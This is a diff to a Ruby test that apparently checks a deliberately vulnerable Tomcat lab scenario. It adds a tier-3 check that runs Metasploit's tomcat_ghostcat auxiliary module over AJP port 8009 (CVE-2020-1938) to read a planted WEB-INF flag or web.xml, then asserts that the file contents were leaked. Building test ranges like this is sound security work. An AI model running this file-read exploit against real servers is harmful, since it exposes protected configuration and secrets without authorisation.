@@ -58,12 +58,54 @@ class TomcatGhostcatAjpTest < PostProvisionTest
       end
     end
 
-    # Tier 3 (exploit) is proven with the stock Metasploit auxiliary
-    # auxiliary/admin/http/tomcat_ghostcat (run_msf_module), which reads the
-    # planted WEB-INF file over AJP. It gives no shell, so test_msf_exploit does
-    # not apply; the driver wires up run_msf_module against the attacker VM.
-    # TODO tier 3 (exploit): deferred — wire up test_msf_exploit when attacker VM is available
-    # msf_module: auxiliary/admin/http/tomcat_ghostcat
+    # Tier 3 (exploit): the stock Metasploit auxiliary
+    # auxiliary/admin/http/tomcat_ghostcat reads a file under the web app over
+    # AJP (CVE-2020-1938). It gives no shell, so test_msf_exploit does not apply;
+    # run_msf_module runs it on the attacker and we assert on the file contents it
+    # prints in msf_output. SKIPs cleanly when the scenario has no attacker VM.
+    #
+    # AJP_PORT is set by the service module's server.xml (address="0.0.0.0"
+    # port 8009); it is not a read_fact, so it is a constant here as in tier 2.
+    tier(3) do
+      ajp_port = 8009
+
+      # Prefer reading the planted WEB-INF flag - that file is never served over
+      # HTTP (tier 2 proves the 404), so reading it over AJP is the info leak.
+      # The leaked string is multi-line; match its most distinctive word token so
+      # the check survives however MSF reflows the file contents into its output.
+      leaked_string = self.json_inputs['strings_to_leak']&.first
+      token = leaked_string && leaked_string.scan(/\w{5,}/).max_by(&:length)
+
+      if flag_path && token
+        filename = "/WEB-INF/#{leaked_filename}"
+        expected = token
+        what     = "planted WEB-INF flag #{filename}"
+      else
+        # No planted flag (or no distinctive token): fall back to WEB-INF/web.xml,
+        # which every Tomcat web app has and which is also blocked over HTTP.
+        filename = '/WEB-INF/web.xml'
+        expected = '</web-app>'
+        what     = 'WEB-INF/web.xml'
+      end
+
+      aux = run_msf_module('auxiliary/admin/http/tomcat_ghostcat',
+                           options: { 'RPORT' => ajp_port, 'FILENAME' => filename },
+                           label: 'ghostcat ajp file read')
+      next unless aux
+
+      if aux[:msf_output].include?(expected)
+        pass_check('ghostcat ajp file read',
+                   "Ghostcat confirmed: MSF auxiliary on #{aux[:attacker]} read " \
+                   "#{what} from //#{aux[:rhost]}:#{ajp_port} over AJP " \
+                   "(expected content present in msf_output).",
+                   tier: 3)
+      else
+        fail_check('ghostcat ajp file read',
+                   "Could not read #{what} over AJP - expected content not found " \
+                   "in msf_output. See msf_output_tomcat_ghostcat evidence.",
+                   tier: 3)
+      end
+    end
   end
 end
 
